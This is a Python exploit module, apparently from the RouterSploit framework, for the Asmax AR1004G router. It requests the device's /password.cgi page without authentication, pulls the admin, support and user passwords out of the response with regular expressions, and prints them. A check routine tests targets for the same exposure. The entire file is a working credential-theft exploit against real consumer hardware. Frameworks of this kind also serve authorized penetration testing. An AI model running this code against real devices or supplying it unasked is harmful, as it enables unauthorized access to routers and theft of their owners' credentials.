import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Asmax AR1004G Password Disclosure",
        "description": "Exploits Asmax AR1004G Password Disclosure vulnerability that allows to "
                       "fetch credentials for: Admin, Support and User accounts.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/lucyoa/exploits/blob/master/asmax/asmax.txt",
        ),
        "devices": (
            "Asmax AR 1004g",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        creds = []

        print_status("Requesting {}".format(self.get_target_url()))
        response = self.http_request(
            method="GET",
            path="/password.cgi",
        )
        if response is None:
            print_error("Exploit failed - empty response")
            return

        tokens = [
            ("admin", r"pwdAdmin = '(.+?)'"),
            ("support", r"pwdSupport = '(.+?)'"),
            ("user", r"pwdUser = '(.+?)'")
        ]

        print_status("Trying to extract credentials")
        for token in tokens:
            res = re.findall(token[1], response.text)
            if res:
                creds.append((token[0], res[0]))

        if creds:
            print_success("Credentials found")
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Exploit failed - credentials could not be found")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/password.cgi"
        )

        if response is None:
            return False  # target is not vulnerable

        if any(map(lambda x: x in response.text, ["pwdSupport", "pwdUser", "pwdAdmin"])):
            return True  # target vulnerable

        return False  # target not vulnerable
